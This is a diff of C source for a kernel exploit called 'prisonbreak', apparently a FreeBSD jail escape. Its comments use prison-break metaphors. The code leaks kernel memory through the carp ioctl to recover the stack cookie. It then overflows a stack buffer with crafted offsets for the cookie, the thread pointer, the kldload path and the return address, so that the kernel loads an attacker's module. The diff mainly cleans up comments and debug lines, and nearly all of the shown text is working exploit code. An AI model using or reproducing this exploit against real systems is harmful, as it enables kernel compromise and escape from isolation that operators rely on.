@@ -194,7 +194,7 @@ void* prisonbreak(void* arg) {
 
   // Enumerate the carp interfaces...
   // and leak some kernel memory while we're at it,
-  // i.e. get an unsuspecting prison guard's access badge.
+  // i.e., get an unsuspecting prison guard's access badge.
   if (ioctl(sock, SIOCGVH, (caddr_t)&ifr_get) == -1) {
     perror("ioctl");
     exit(1);
@@ -227,7 +227,7 @@ void* prisonbreak(void* arg) {
   // to overflow the stack with data we control. The calculated length accounts
   // for other locals, padding, the stack cookie, saved registers, the caller's
   // frame pointer and finally the saved return address.
-  // In other words: we need to dig a long enough tunnel.
+  // In other words, we need to dig a long enough tunnel.
   int len = 2896;
   synchdr_t* header = malloc(len);
 
@@ -237,13 +237,10 @@ void* prisonbreak(void* arg) {
   // Fill the buffer with cyclic data to make it easy to calculate offsets
   cyclic((char*)header, len);
 
-  unsigned long* kernel_module_path = (unsigned long*)(header + sizeof(synchdr_t));
-  strcpy((char*)kernel_module_path, "./prisonbreak.ko");
-
-  // Restore the stack cookie at the location we know it should go using the
+  // Restore the stack cookie at the location we know it should go, using the
   // value extracted earlier to please the stack protection checker 2048 + 32 =
   // 2080 (start of our overflow) + 752 bytes = 2832
-  // i.e. use the badge we got off that guard.
+  // i.e., use the badge we got off that guard.
   int stack_cookie_offset = 2832;
   unsigned long* ptr = (unsigned long*)((char*)header + stack_cookie_offset);
   *ptr = stack_cookie;
@@ -252,7 +249,6 @@ void* prisonbreak(void* arg) {
   int td_offset = 2872;
   // int td_offset = 2872 - 24;
   ptr = (unsigned long*)((char*)header + td_offset);
-  // *ptr = 0x2222222222222222;
   *ptr = get_td();
 
   // Overwrite the address where kern_kldload is going to read the string
@@ -260,15 +256,12 @@ void* prisonbreak(void* arg) {
   int kernel_module_path_offset = 2864;
   // int kernel_module_path_offset = 2864 + 8;
   ptr = (unsigned long*)((char*)header + kernel_module_path_offset);
-  // *ptr = 0x3333333333333333;
-  // *ptr = (unsigned long)kernel_module_path;
   *ptr = get_pargs();
 
   // Overwrite the address where kern_kldload is going to read the fileid
   int fileid_offset = 2840;
   // int fileid_offset = 2840 + 23;
   ptr = (unsigned long*)((char*)header + fileid_offset);
-  // *ptr = 0x4444444444444444;
   *ptr = 0;
 
   // Restore $rbp
@@ -288,7 +281,7 @@ void* prisonbreak(void* arg) {
   *ptr = jump_to_address;
 
   // Populate the header with expected values so we pass all the checks and get
-  // to where we need to be, i.e. have another inmate create a diversion by setting their mattress on fire.
+  // to where we need to be, i.e., have another inmate create a diversion by setting their mattress on fire.
   header->sm_magic = htonl(0x0FF51DE5);
   header->sm_v = 4;
   header->sm_p = 4;
@@ -330,16 +323,6 @@ int map_memory() {
   printf("Mapped %zu bytes (%zu pages) at fixed address %p\n", len, pages, p);
   memset(p, 0x00, len);
 
-  // if (mlock(p, len) != 0) {
-  //   fprintf(stderr, "mlock failed: %s\n", strerror(errno));
-  //   fprintf(stderr, "Hint: check RLIMIT_MEMLOCK (ulimit -l) / CAP_IPC_LOCK.\n");
-  //   munmap(p, len);
-  //   return 4;
-  // }
-
-  // printf("Locked mapping with mlock().\n");
-
-  // Do work...   exploit .....
   return 0;
 }
 
